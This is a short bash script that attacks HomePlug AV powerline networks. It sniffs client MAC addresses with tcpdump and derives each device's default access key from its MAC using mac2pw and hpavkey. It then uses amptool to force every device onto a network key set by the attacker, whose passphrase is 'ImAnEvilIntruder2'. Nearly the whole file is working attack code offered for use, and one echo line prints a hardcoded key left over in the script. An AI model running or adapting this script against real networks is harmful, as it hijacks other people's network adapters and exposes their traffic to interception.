#!/bin/bash
# Start by sniffing out clients

INTERFACE='eth0'

python triggerSniff.py
tcpdump -s0 -w cap.pcap & sleep 10s && pkill tcpdump

NEWKEY=$(hpavkey -M 'ImAnEvilIntruder2')


# Set the NMK of our local device
amptool -M -K $NEWKEY -i $INTERFACE

# Give it time to reset
echo "Waiting a few seconds"
sleep 5

    # Cycle through
    python listMacs.py cap.pcap | sort | uniq | while read -r address
    do
    macsolid=$(echo $address | awk -F:\  '{print toupper($2)}' | sed 's/ //g')
    maccolon=$(echo $address | awk -F:\  '{print toupper($2)}' | sed 's/ /:/g')

    pass=$(mac2pw -q $macsolid)
    dak=$( hpavkey -D $pass )

    # Configure the device
    echo "Attempting to enrol $maccolon"
    echo "amptool -D 54F10ACDE00B6473DF60F663802025DE -J $maccolon -i $INTERFACE -M -K $NEWKEY#End of command"
    amptool -D $dak -J $maccolon -i $INTERFACE -M -K $NEWKEY
    sleep 1
done
